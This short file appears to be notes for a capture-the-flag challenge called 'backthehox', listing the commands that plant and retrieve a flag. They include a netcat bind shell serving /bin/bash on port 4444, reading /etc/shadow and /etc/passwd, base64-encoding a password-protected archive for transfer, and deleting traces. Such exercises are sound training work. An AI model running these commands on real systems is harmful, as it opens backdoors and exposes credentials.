# backthehox

zip data.zip flag.txt -P `cat /tmp/.secret_password`

echo AFNOM{Ju5t_us3_SSH} > flag.txt

nc.traditional -lkp 4444 -e /bin/bash

echo MySuperSecretPass > /tmp/.secret_password

python3 -c 'import pty; pty.spawn("/bin/bash")'

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

pwd

whoami

ls

ls -al

cat /etc/shadow

cat /etc/passwd

zip data.zip flag.txt -P `cat /tmp/.secret_password`

rm /tmp/.secret_password

unzip data.zip

cat data.zip | base64

rm data.zip
```